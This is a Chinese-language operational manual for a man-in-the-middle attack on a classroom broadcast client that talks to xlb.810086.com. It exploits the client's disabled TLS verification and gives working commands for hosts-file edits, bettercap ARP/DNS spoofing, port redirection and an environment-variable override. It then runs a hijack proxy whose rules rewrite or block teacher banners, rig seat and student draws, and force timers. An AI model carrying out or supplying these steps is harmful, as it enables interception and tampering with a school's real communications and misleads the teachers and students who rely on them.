# MITM 部署手册 — 不碰 DESKTOP_BROADCAST_SERVER_URL，劫持连真实 810086.com 的客户端

## 原理

客户端 `main.js:204/656`:

```js
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
```

TLS 校验全局关闭 + 所有请求走 `getServerOrigin()`（`main.js:1669`，无证书钉扎）→
只要让客户端把 `xlb.810086.com` 解析到攻击者机器，代理的自签证书直接被接受，
流量完整进出，改写后原样转发真实服务器。

## 模式 A: 教室本机 hosts（最简单，物理接触一次即可）

管理员 PowerShell（在教室电脑上）:

```powershell
Add-Content C:\Windows\System32\drivers\etc\hosts "`n127.0.0.1 xlb.810086.com"
```

攻击机=本机，代理监听 443（TLS）+ 8100（规则管理）:

```
python poc\hijack_proxy.py --host 0.0.0.0 --tls-port 443 --http-port 8100
```

客户端启动后所有流量经代理进出真实服务器，横幅/座位/计时器全部可改。

## 模式 B: 同网段 ARP + DNS 欺骗（不接触教室电脑）

需要攻击机有两个身份: 转发层（把 443 流量导给代理）+ 代理本身。

### B1. bettercap 一条龙（推荐）

```
# attackers.yml: net.sniff 可去掉，只要欺骗和转发
sudo bettercap -iface <iface> -eval "
  set arp.spoof.targets <教室电脑IP>;
  arp.spoof on;
  set dns.spoof.domains xlb.810086.com;
  set dns.spoof.address <攻击机IP>;
  dns.spoof on"
```

然后攻击机上把外部 443 转到本机代理 TLS 端口（Windows, 管理员）:

```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=443 connectaddress=127.0.0.1 connectport=443
```

（若攻击机本身是 Linux: `iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 443` 即同机直听，无需 portproxy。）

### B2. 纯 Windows（无 bettercap）: PowerShell ARP 欺骗脚本思路

Windows 没有 arp 原始包注入，实际操作用以下任一:
- `nishang` 的 Invoke ARP 攻击脚本（需 Npcap）
- 直接下载 bettercap Windows 版 + Npcap（同 B1）
- 路由器/网关控制权场景: 直接在 DHCP/DNS 里把 `xlb.810086.com` 解析指到攻击机（零 ARP 工作，最稳）

## 模式 C: 环境变量（有本地执行权时，最快）

```
set DESKTOP_BROADCAST_SERVER_URL=http://127.0.0.1:8100
```

参照现有 `start_rogue_lab.bat`，代理 `--tls-port 0` 只开明文即可。

## 运行代理（通用）

```
cd poc
pip install aiohttp cryptography
python hijack_proxy.py --selftest          # 规则引擎自检（5 项 oracle）
python hijack_proxy.py --host 0.0.0.0 --tls-port 443 --http-port 8100
```

## 规则热更新（运行中随时改）

```bash
curl http://127.0.0.1:8100/__rules                    # 查看
curl -X POST http://127.0.0.1:8100/__rules \
     -H "Content-Type: application/json" \
     -d @hijack_rules.json                             # 覆盖
```

## 规则速查

| 需求 | 规则 |
|---|---|
| 替换特定词 | `banner.replace: [["原文","改文"]]` |
| 尾部加话 | `banner.append: " ——教务处提醒"` |
| 删除某些话 | `banner.remove: ["请家长签字"]` |
| 禁止横幅 | `banner.block_banner: true` |
| 禁止汉化/热更新包 | `block_ws_types: ["renderer.pack.push"]` |
| xx 和 xx 永远坐一起 | `seat.pairs: [["小明","小红"]]` |
| 某人永不被抽 | `seat.exclude: ["张三"]` |
| 只抽指定的人 | `seat.only: ["李四","王五"]` |
| 改横幅自动关闭时间 | `timer.force_seconds: 9999` 或 `3` |

## 验证 oracle

- 改写成功: 代理日志 `BANNER rewrite: '<原文>' -> '<改文>'`
- 丢帧: `frame DROPPED (id=...)`
- 计时器: `TIMER forced: Ns`
- 座位: `SEAT pair: 小明 <-> 小红 now adjacent` / `SEAT exclude: 张三 -> empty`
- 端到端: 教师端发一条带关键词的横幅，教室大屏显示的文本与规则表一致；
  横幅自动关闭时长等于 `timer.force_seconds`。
